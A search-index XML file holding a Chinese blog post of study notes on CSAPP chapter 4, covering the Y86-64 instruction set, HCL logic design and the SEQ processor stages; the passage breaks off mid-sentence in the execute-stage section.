<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CSAPP 第四章 处理器体系结构</title>
    <link href="/2023/10/22/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <url>/2023/10/22/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>通过设计一个 Y86-64 体系结构来理解处理器</p><span id="more"></span><p>一个处理器支持的指令和指令的字节集编码被称为它的指令集体系结构（Instruction-Set Architecture，<strong>ISA</strong>）。我们之前一直学习的处理器的命令就是 ”x86-64“ 的指令集。</p><p>不同的处理器“家族”有不同的ISA。同一个家族里也有不同型号的处理器，但是大多保持兼容。</p><h1 id="Y86-64指令集体系结构"><a href="#Y86-64指令集体系结构" class="headerlink" title="Y86-64指令集体系结构"></a>Y86-64指令集体系结构</h1><blockquote><p>这并不是一个真实被应用的指令集，这是为了方便学习来根据 x86-64定义的一个精简版指令集体系结构</p></blockquote><h3 id="程序员可见的状态"><a href="#程序员可见的状态" class="headerlink" title="程序员可见的状态"></a>程序员可见的状态</h3><ul><li><p>Y86-64程序中的每条指令都会读取或修改处理器状态的某些部分，这称为<strong>程序员可见的状态</strong>。</p></li><li><p>这里的“程序员”既可以是用汇编代码写程序的人，也可以是产生机器级代码的编译器</p></li></ul><blockquote><p>在处理器的实现中，只要我们保证机器及程序能够访问程序员可见状态，就不需要完全按照 ISA 暗示的方法来表示和组织这个处理器状态</p></blockquote><p>Y86-64 的状态类似 x86-64 。有 15 个寄存器：%rax，%rcx，%rdx，%rbx，%rsp，%rbp，%rsi，%rdi 以及 %r8-%r14，每个寄存器存储一个 64 位的字。为了简化指令编码，我们减少了一个 %r15 寄存器。</p><p>其中，**%rsp 作为栈指针<strong>被用于入栈出栈，</strong>程序计数器<strong>（PC，也就是%rip）</strong>存放当前指令执行的地址**。</p><p>除此之外还有 3 个 1 位的<strong>条件码 ZF、SF 和 OF，用于条件跳转</strong>。程序状态的最后一个部分是<strong>状态码（Stat），表示程序的总体状态</strong>，提示程序正常是否运行或者是出现了某种异常。</p><p>其他的概念我们都认为它和 x86-64 相同或更加简化。</p><h3 id="Y86-64-指令"><a href="#Y86-64-指令" class="headerlink" title="Y86-64 指令"></a>Y86-64 指令</h3><p>如下图就是我们的 Y86-64 指令的简单描述，左边是指令的汇编码表示，右边是字节编码：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4.png"></p><h5 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h5><p>x86-64 的 movq 指令被分为了 4 个不同的指令，irmovq、rrmovq、mrmovq、rmmovq，分别对应了源和目的的种类数：立即数-寄存器，寄存器-寄存器，内存-寄存器，寄存器-内存。Y86-64 与 x86-64 相同，不允许直接从内存地址传送到另一个内存地址，必须通过寄存器传送。</p><h5 id="整数操作指令"><a href="#整数操作指令" class="headerlink" title="整数操作指令"></a>整数操作指令</h5><p>有四种类型的整数操作（addq，subq，andq，xorq），他们只对寄存器进行操作。除此之外，这些指令还会设置条件码。</p><h5 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h5><p>有七个跳转指令，一个无条件跳转和六个条件跳转（jle，jl，je，jne，jge，jg），工作原理和 X86-64 相同。</p><h5 id="条件传送指令"><a href="#条件传送指令" class="headerlink" title="条件传送指令"></a>条件传送指令</h5><p>有六个条件传送指令（cmovXX），与条件跳转类似。</p><h5 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h5><p>call 指令，将返回地址入栈，然后跳到目的地址。ret 指令从调用中返回。</p><h5 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h5><p>也与 x86-64 类似，有入栈（push）和出栈（pop）的操作。</p><h3 id="指令编码"><a href="#指令编码" class="headerlink" title="指令编码"></a>指令编码</h3><blockquote><p>具体图示如上一小节示例图</p></blockquote><p>每一个指令的第一个字节表示指令的类型，而这一个字节又分为两部分：高 4 位是代码部分，低 4 位是功能部分.其中功能值只有在一组相关指令共用一个代码才会被使用。如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4%E5%85%B7%E4%BD%93%E5%8A%9F%E8%83%BD%E7%A0%81.png"></p><p>有的指令只有一字节长，有的就需要附加的寄存器指示符字节来指定一个或者两个寄存器，这些寄存器称为 rA 和 rB 。</p><p>15 个寄存器每一个都有自己的标识符，范围是 0~0xE。如果寄存器的字段为0xF，就表示此处没有寄存器操作数，只需要一个寄存器的指令比如 pushq 和 popq 指令，也会将其他的寄存器设置为 0xF。</p><p>分支指令调用的地址是绝对地址而不是 PC 寻址，因为我们更注重描述的简单性。</p><p><strong>指令集的一个重要的性质是字节编码必须有唯一的解释。</strong></p><h3 id="Y86-64异常"><a href="#Y86-64异常" class="headerlink" title="Y86-64异常"></a>Y86-64异常</h3><p>对于 Y86-64 来讲，程序员可见的状态包括状态码 start ，它描述程序执行的总体状态。而其他的代码则表示发生了某种类型的异常，具体如下表：</p><table><thead><tr><th align="center">值</th><th align="center">名字</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">AOK</td><td align="center">正常操作</td></tr><tr><td align="center">2</td><td align="center">HLT</td><td align="center">遇到halt指令</td></tr><tr><td align="center">3</td><td align="center">ADR</td><td align="center">遇到非法地址</td></tr><tr><td align="center">4</td><td align="center">INS</td><td align="center">遇到非法指令</td></tr></tbody></table><p>在Y86-64 中，我们简化处理，让程序遇到异常就停止执行指令而不是单独编写一个异常处理程序。</p><h3 id="Y86-64程序"><a href="#Y86-64程序" class="headerlink" title="Y86-64程序"></a>Y86-64程序</h3><p>Y86-64 代码与 x86-64 代码类似，但有以下几点不同：</p><ul><li>add 指令不能直接加一个常数，Opq 指令只能对两个寄存器做运算。因为 Y86-64 的算术指令中<strong>不能使用立即数</strong>，需要先加载到寄存器中。</li><li>subq 指令可以<strong>直接设置条件码</strong>。在 x86-64 架构下，我们需要再多一个 test 命令才能实现设置条件码。</li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.pos 0<br>irmovq stack,%rsp<br>call main<br>halt<br><br>array:<br>.quad 0x000d000d000d<br>.quad 0x00c000c000c0<br>.quad 0x0b000b000b00<br>.quad 0xa000a000a000<br><br>main:<br>irmovq array,%rdi<br>irmovq $4,%rsi<br>call sum         <br>ret<br><br>sum:<br>irmovq $8,%r8<br>irmovq $1,%r9<br>xorq %rax,%rax<br>andq %rsi,%rsi<br>jmp test<br><br>loop:<br>mrmovq (%rdi),%r10<br>addq %r10,%rax<br>addq %r8,%rdi<br>subq %r9,%rsi<br><br>test:<br>jne loop<br>ret<br><br>.pos 0x200<br>stack:<br></code></pre></td></tr></table></figure><p>在上面的程序中，以 . 开头的词是汇编器伪指令，他们告诉汇编器台哦正地址，以便产生代码或者插入数据。例如 <code>.pos 0</code> 告诉汇编器应该从地址0 处产生代码。</p><p>其他的代码指令和 x86-64含义相同，我们可以推断出这个函数目的实现 <code>WORD sum(WORD *array,WORD length)</code>，而该函数会求出 array[0]~array[length] 的和。</p><h3 id="一些-Y86-64-指令的详情"><a href="#一些-Y86-64-指令的详情" class="headerlink" title="一些 Y86-64 指令的详情"></a>一些 Y86-64 指令的详情</h3><p>需要特别注意 pushq 指令和 popq 指令。</p><p>pushq 指令会把栈指针减 8 ，并将一个寄存器值写入内存中，当我们执行 <code>pushq %rsp</code> 时，处理器的行为是不确定的，因为入栈的寄存器会在这条指令中被更改状态，这种情况下就会存在两种不同的结果：</p><ul><li>压入 %rsp 的原始值（x86-64采用的约定）</li><li>压入减去 8 的 %rsp 的值</li></ul><p>我们运行书中的测试程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rsp,%rax<br>pushq %rsp<br>popq %rdx<br>subq %rdx,%rax<br>ret<br></code></pre></td></tr></table></figure><p>它的返回值总是0，也就是说 pushq 指令是先放后减。</p><p>同样 popq 也有这样的歧义，树上的测试程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rsp,%rdi<br>pushq $0xabcd<br>popq %rsp<br>movq %rsp,%rax<br>movq %rdi,%rsp<br>ret<br></code></pre></td></tr></table></figure><p>函数的返回值总是 0xabcd，说明 <code>pop %rsp</code> 是先减去了 %rsp 再赋的值。</p><p>也就是说，push 和 pop 两个指令在对 %rsp 寄存器本身操作时，都会尽量保证得到的值是原始值。</p><ul><li><p>pushq %rsp 一定会压最初的 %rsp。</p></li><li><p>popq %rsp 一定是把那个值正确地给到了 %rsp。</p></li></ul><h1 id="逻辑设计和硬件控制语言-HCL"><a href="#逻辑设计和硬件控制语言-HCL" class="headerlink" title="逻辑设计和硬件控制语言 HCL"></a>逻辑设计和硬件控制语言 HCL</h1><blockquote><p>这部分应该是模电（还是叫数电？）的知识叭应该</p></blockquote><h3 id="逻辑门"><a href="#逻辑门" class="headerlink" title="逻辑门"></a>逻辑门</h3><p>逻辑门是数学电路的基本计算单元，它产生的输出等于他们输入<strong>位值</strong>的某个布尔函数。</p><p>常见的逻辑门就是 and 、or 、not，并且 and 、or 常见为两输入，但是可以扩展到 n 输入的状态，比如三输入的与门用 HCL 表示就为 <code>a&amp;&amp;b&amp;&amp;c</code>。逻辑门总是活动的，一旦一个门的输入发生变化，在很短的时间内输出也会相应变化。</p><h3 id="组合电路和HCL-布尔表达式"><a href="#组合电路和HCL-布尔表达式" class="headerlink" title="组合电路和HCL 布尔表达式"></a>组合电路和HCL 布尔表达式</h3><p>将很多的逻辑门组合成一个网，就能构建计算块，成为组合电路。如何构建这些网有以下的限制：</p><ul><li><p>每个逻辑门的输入必须连接到三个选择项之一：一个系统的输入、某个寄存器单元的输入或某个逻辑门的输入</p></li><li><p>两个或多个逻辑门的输入不能连接在一起</p></li><li><p>网必须是无环的，也就是说不能形成回路</p></li></ul><p>多路复用器（MUX）根据输入控制信号的值，从一组不同的数据信号中选择一个。</p><p>HCL 组合逻辑电路和 C 语言逻辑表达式之间有以下不同：</p><ul><li><p>组合电路会持续地响应输入的变化，C 语言只会在程序运行过程中对应语句被执行到才会进行求值</p></li><li><p>C 语言的逻辑表达式允许参数是任意整数，会自动转化为0 (false) 和非0 (true) ，而逻辑门只对位值 0 和 1 进行操作</p></li><li><p>C 逻辑表达式可能会出现部分求值的特性，如果一个 and 或者 or 运算只对第一个参数求值之后就能确定，那么就不会对第二个参数求值了，而组合逻辑电路没有这种规则。</p></li></ul><h3 id="字级的组合电路和HCL整数表达式"><a href="#字级的组合电路和HCL整数表达式" class="headerlink" title="字级的组合电路和HCL整数表达式"></a>字级的组合电路和HCL整数表达式</h3><p>利用逻辑门组合成的网，我们就可以设计出对数据字操作的电路。其中，组合电路分局输入字的每个位，用逻辑门分别计算输出字的每一位。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%AD%97%E7%BA%A7%E7%BB%84%E5%90%88%E7%94%B5%E8%B7%AF.png"></p><p>在 HCL 中，多路复用函数使用<strong>情况表达式</strong>来描述的，情况表达式的通用格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hcl">[<br>select1:expr1;<br>select2:expr2;<br>select3:expr3;<br>...<br>selectk:exprk;<br>]<br></code></pre></td></tr></table></figure><p>表达式包含一系列的情况，每种情况 i 都有一个布尔表达式 select 和一个整数表达式 expr ，分别表示什么时候选择这种情况和会得到什么值。</p><p>需要注意的是，情况表达式并<strong>不要求各个不同的选项之间互斥</strong>，但是并不会出现多个结果，在实际的选择过程中是按<strong>顺序进行</strong>的，且第一个求值为1的情况会被选中。</p><p>eg：设计一个逻辑电路来找一组字  a、b、c 的最小值，就可以这样表达：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word min=[<br>a&lt;=b &amp;&amp;a&lt;=c : a;<br>b&lt;=a &amp;&amp;b&lt;=c : b;<br>1           : c;<br>]<br></code></pre></td></tr></table></figure><p>其中最后一个选择表达式1，意味如果前面的都没有被选中，那就选择这种情况。这也是比较常用的指定默认情况的方法。</p><h3 id="集合关系"><a href="#集合关系" class="headerlink" title="集合关系"></a>集合关系</h3><p>集合关系用来将一个信号与许多可能匹配的信号作比较，以此来检测正在处理的某个指令是否<strong>属于</strong>某一类指令代码。</p><p>判断集合关系的通用格式是：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">iexpr in </span><span class="hljs-template-variable">&#123;iexpr1,iexpr2,...,iexprk&#125;</span><br></code></pre></td></tr></table></figure><h3 id="存储器时钟"><a href="#存储器时钟" class="headerlink" title="存储器时钟"></a>存储器时钟</h3><p>组合电路从本质上讲并不存储任何信息，我们想要产生时序电路必须引进按位存储信息的设备。</p><p>存储设备都是由同一个时钟控制的，时钟是一个周期性的信号，决定什么时候要把新值加载到设备中。我们考虑以下两种存储器设备：</p><ul><li>时钟寄存器（简称寄存器）：存储单个位或字，时钟信号控制寄存器加载输入值。</li><li>随机访问存储器（简称内存，Random Access Memory）：存储多个字，通过地址选择该读或该写哪些字。</li></ul><p>需要注意的是硬件中的 ”寄存器“ 和机器级编程中的 ”寄存器“ 并不是完全相同的概念，硬件中的寄存器是一个电子元件，机器编程中寄存器代表 CPU 中可寻址的字，它们存储在寄存器文件中。我们分别称呼这两类寄存器位 ”硬件寄存器“ 和 ”程序寄存器“。</p><p>大多时候，寄存器输出会一直保持在当前的寄存器状态上，只有每个时钟到达上升沿时，值才会从寄存器的输入传送到输出。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%AF%84%E5%AD%98%E5%99%A8%E6%96%87%E4%BB%B6.png"></p><p>如上图，每个寄存器文件都有两个读端口和一个写端口。这样的多端口访问机制允许同时进行多个读和写操作。</p><p>同样，因为可以同时进行多个读写操作，就不可避免地发生冲突。这时候我们的随机访问寄存器就派上了用场。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E9%9A%8F%E6%9C%BA%E8%AE%BF%E9%97%AE%E5%AF%84%E5%AD%98%E5%99%A8.png"></p><p>这个内存有一个地址输人，一个写的数据输入，以及一个读的数据输出。</p><p>其中从内存中读的操作类似于组合逻辑，如果我们在输入 address 上提供一个地址, 并将 write 控制信号设置为 0, 那么在经过一些延迟之后，存储在那个地址上的值会出现在输出 data 上，内存将不会响应输入地址上的数据写入请求。如果地址超出了范围，error 信号会设置为 1，否则就设置为 0。</p><p>写内存是由时钟控制的：我们将 address 设置为期望的地址，将 data in 设置为期望的值， write 设置为 1。然后当我们控制时钟时，只要地址是合法的，就会更新内存中指定的位置。</p><p>对于读操作来说，如果地址是不合法的，error 信号会被设置为 1。这个信号是由组合逻辑产生的， 因为所需要的边界检查纯粹就是地址输人的函数，不涉及保存任何状态。</p><h1 id="Y86-64的顺序实现"><a href="#Y86-64的顺序实现" class="headerlink" title="Y86-64的顺序实现"></a>Y86-64的顺序实现</h1><p>首先，我们描述一个称为 SEQ 的处理器。每个时钟周期上，SEQ 执行处理一条完整指令所需的所有步骤。但这需要一个很长的周期，我们需要改进这个缺点，缩短时钟的周期，以实现最终的目的——<strong>实现一个高效、流水线化的处理器</strong>。</p><h3 id="将处理组织成阶段"><a href="#将处理组织成阶段" class="headerlink" title="将处理组织成阶段"></a>将处理组织成阶段</h3><p>处理一条指令包括很多操作，主要有以下几个阶段：</p><ul><li><p>取指 （fetch）</p><p>取指是指从内存中读取指令操作<del>（不是打错字了）</del>，地址为程序计数器的值。从指令中抽取出指令指示符字节的两个四位部分，称为 <em>icode</em>（指令代码）和 <em>ifun</em>（指令功能）。</p><p>它可能取出一个寄存器指示符字节，指明一个或两个寄存器操作数指示符 rA 和 rB 。它还可能取出一个四字节常数字valc。它按顺序方式计算当前指令的下一条指令的地址 <em>valP</em> 。也就是说，valP 等于 PC 的值加上已取出指令的长度。</p></li><li><p>译码（decode）</p><p>译码阶段从寄存器文件中读入最多两个操作数，得到值 <em>valA</em> 和 <em>valB</em>。通常，它读入指令rA和rB字段指明的寄存器，不过有些指令是读寄存器 %rsp 的。</p></li><li><p>执行（execute）</p><p>在执行阶段，算术&#x2F;逻辑单元（ALU）要么执行指令指明的操作（根据ifun的值），计算内存引用的有效地址，要么增加或减少栈指针。得到的值我们称为 <em>valE</em> 。除此之外我们可以设置条件码来限制传送条件。</p></li><li><p>访存（memory）</p><p>访存阶段可以将数据写入内存，或者从内存读出数据。读出的值为 <em>valM</em>。</p></li><li><p>写回（write back）</p><p>写回阶段最多可以写两个结果到寄存器文件。</p></li><li><p>更新PC（PC update）</p><p>将PC设置成下一条指令的地址，更新 %rip 寄存器。</p></li></ul><p>处理器无限循环来执行这些阶段，在我们简化的实现中，任何一个阶段异常处理器都会停止。</p><p>我们采用通用框架来将指令映射到硬件中，例如下表是对 Opq、rrmovq 和 irmovq 类型的指令所需要的处理：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0.png"></p><p>整数操作都遵循上面的通用模式，在取指阶段我们不需要常数，valP 的值计算为 PC+2 。</p><p>需要注意 push 指令的实现，%rsp 的指针是先减去 8 再写入的，具体流程见下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-pushq%E5%AE%9E%E7%8E%B0.png"></p><h3 id="SEQ硬件结构"><a href="#SEQ硬件结构" class="headerlink" title="SEQ硬件结构"></a>SEQ硬件结构</h3><p>要完成 y86-64 指令的六个基本阶段，需要相应的硬件结构，如下图为硬件结构对应的抽象表示：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ%E7%A1%AC%E4%BB%B6%E7%BB%93%E6%9E%84.png"></p><p>硬件单元与各个阶段相关联：</p><ul><li>取指：将 PC 作为地址从对应的内存中读取指令，PC 增加器计算指令长度并将新的 PC 暂时放入值 valP 当中</li><li>译码：从寄存器文件中同时读取对应寄存器的值，得到两个操作数</li><li>执行：根据指令类型，将算数&#x2F;逻辑单元用于不同的目的，执行指定运算、改变指针或者计算有效地址等等。这一步可能会更新标志寄存器</li><li>访存：对内存进行访问（读&#x2F;写）</li><li>写回：将新的寄存器值更新到寄存器文件中，这里有两个写端口， E 用于接收 ALU 计算的结果、valM 用于接收读取内存的结果。</li><li>PC 更新：根据预先保存的地址或者是之前计算的指令预计的下一步位置去更新 PC。</li></ul><h3 id="SEQ的时序"><a href="#SEQ的时序" class="headerlink" title="SEQ的时序"></a>SEQ的时序</h3><p>SEQ 的实现包括组合逻辑和两种存储器设备：时钟寄存器（程序计数器和条件码寄存器），随机访问存储器（寄存器文件、指令内存和数据内存）。</p><p>组合逻辑不需要任何时序或控制，只要输人变化了，值就通过逻辑门网络传播。其中读随机访问存储器的操作可以简化地看作是一个立即响应输入地址的组合逻辑操作。</p><p>程序计数器、 条件码寄存器、数据内存和寄存器文件这四个硬件需要有明确的时序控制。这些单元通过一个时钟信号来控制，它触发将新值装载到寄存器，以及将值写到随机访问存储器。由于我们遵循<strong>从不回读</strong>的原则，我们只需要控制内存和寄存器的时钟控制信号。</p><blockquote><p>从不回读：处理器从来不需要为了完成一条指令的执行而去读由该指令更新了的状态。</p></blockquote><h3 id="SEQ阶段的实现"><a href="#SEQ阶段的实现" class="headerlink" title="SEQ阶段的实现"></a>SEQ阶段的实现</h3><p>我们为不同的常数值赋予了不同的意义，包括指示指令代码、功能码、寄存器值和ALU状态等等。具体如下表：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%B8%B8%E6%95%B0%E5%90%AB%E4%B9%89.png"></p><p>其中 nop 指令处了将 pc 加 1 不进行任何操作；halt 指令设置处理器状态，导致程序停止运行。</p><h4 id="取指阶段"><a href="#取指阶段" class="headerlink" title="取指阶段"></a>取指阶段</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%8F%96%E6%8C%87.png"></p><p>取指阶段包括指令内存硬件单元，以 PC 作为第一个字节（字节 0）的地址，这个单元一次从内存读出 10 个字节。</p><p>10字节中的第一个字节被解释成指令字节（Split），分为两个4位的net数。它又被分割得到 icode 和 ifun 。根据 icode 的值，会进一步判断指令是否合法、是否包含寄存器或者常数。</p><p>对应的 Instr valid 、Need_regids、Need_valC 用 HCL 表示如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs HCL">Instr_valid=<br>icode in&#123;<br>0xC,0xD,0xE,0xF    // 检查没有被赋予特殊意义的常数，也就是检查是否合法<br>&#125;；<br><br>Need_regids =<br>icode in &#123; <br>    IRRMOVQ,IOPQ,IPUSHQ,IPOPQ,<br>    IIRMOVQ,IRMMOVQ,IMRMOVQ<br>&#125;;<br><br>Need_valC=<br>icode in&#123;<br>IIRMOVQ,IMRMOVQ,IRMMOVQ,<br>IJXX,ICALL<br>&#125;；<br></code></pre></td></tr></table></figure><h4 id="译码和写回阶段"><a href="#译码和写回阶段" class="headerlink" title="译码和写回阶段"></a>译码和写回阶段</h4><p>这两个阶段都要访问寄存器文件。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E8%AF%91%E7%A0%81%E5%92%8C%E5%86%99%E5%9B%9E.png"></p><p>寄存器文件有四个端口，它支持同时进行两个读和两个写。</p><p>每个端口都有一个地址连接和一个数据连接，地址连接是一个寄存器 ID，而数据连接是一组 64 根线路，既可以作为寄存器文件的输出字（对读端口来说），也可以作为它的输人字（对写端口来说）。 两个读端口的地址输人为 srcA 和 srcB，而两个写端口的地址输人为 dstE 和 dstM。如果某个地址端口上 的值为特殊标识符 OxF(RNONE)，则表明不需要访问 寄存器。</p><p>也就是说， srcA 和 srcB 决定我们从哪个寄存器读数据，对应从 valA 和 valB 中读出。同理 destE 和 destM 决定要去写哪个寄存器，对应数据从 valE 和 valM 中写入。</p><p>四个端口的 HCL 描述如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word srcA=[<br>icode in &#123;IRRMOVQ,IRMMOVQ,IOPQ,IPUSHQ&#125;:rA;<br>//只有在 rrmovq，rmmovq，OPq，pushq 指令需要读取操作数所包含的寄存器<br>icode in &#123;IPOPQ, IRET &#125; : RRSP;<br>//在 popq 和 ret 两个指令执行的时候，我们需要额外读取一个 rsp 寄存器<br>    1 : RNONE; <br>];<br><br>word srcB = [<br>    icode in &#123;IRMMOVQ, IMRMOVQ, IOPQ  &#125; : rB;<br>    icode in &#123;IPOPQ, IRET, ICALL, IPUSHQ &#125; : RRSP;<br>    1 : RNONE; # Don&#x27;t need register<br>];<br><br>word dstE = [<br>    icode in &#123; IRRMOVQ &#125; : rB;<br>    icode in &#123; IIRMOVQ, I0PQ&#125; : rB;<br>    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;<br>    1 : RNONE; # Don&#x27;t write any register<br>];<br><br>word dstM = [<br>icode in &#123;IMRMOVQ,POPQ&#125;:rA;<br>1 : RNONE;<br>];<br></code></pre></td></tr></table></figure><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>执行阶段包括算数&#x2F;逻辑单元（ALU），这个单 元根据 alufun 信号的设置，对输人 aluA 和 aluB 执行 ADD、SUBTRACT、 AND 或 EXCLUSIVEOR 运算。这些数据和控制信号是由三个控制块产生的。ALU 的输出就是 valE 信号。</p><p>如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%89%A7%E8%A1%8C.png"></p><p>执行阶段的第一步就 是每条指令的 ALU 计算。列出的操作数 aluB 在 前面，后面是 aluA，这样是为了保证 subq 指令是 valB 减去 valA 。</p><p>我们用如下的 HCL 表达式来描述 aluA 的行为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word aluA=[<br>    icode in &#123; IRRMOVQ,IOPQ&#125;:valA; <br>    icode in &#123; IIRMOVQ,IRMMOVQ,IMRMOVQ&#125;:valC; <br>    icode in &#123; ICALL,IPUSHQ&#125;:-8; <br>    icode in &#123; IRET,IPOPQ&#125;:8;<br>    #Other instructions don&#x27;t need ALU<br>];<br></code></pre></td></tr></table></figure><p>aluA 的计算方式取决于指令的类型，主要涉及了不同指令的源操作数。具体的计算方式如下：</p><ul><li>对于 <code>OPq </code> 指令，<code>aluA</code> 的值等于从寄存器 <code>rA</code> 中读取的 <code>valA </code>。</li><li>对于 <code>rrmovq </code> 指令，<code>aluA </code>的值等于 <code>valA</code>，因为这个指令是简单的数据传送，将 <code>valA </code>赋值给目的寄存器。</li><li>对于 <code>irmovq </code> 指令，<code>aluA </code>的值等于 <code>valC</code>，因为这个指令将立即数（常数）<code>valC </code>赋值给目的寄存器。</li><li>对于 <code>rmmovq  </code> 和 <code>mrmovq</code> 指令，<code>aluA </code>的值等于 <code>valC</code>，因为这些指令需要从指令中提取立即数 <code>valC </code>并与目的寄存器的值相加。</li></ul><p>同理，aluB也是如此，具体的计算方式入下：</p><ul><li>对于 <code>rmmovq</code>、<code>mrmovq</code>、<code>OPq</code>、<code>call</code>、<code>pushq</code>、<code>ret</code> 和 <code>popq</code> 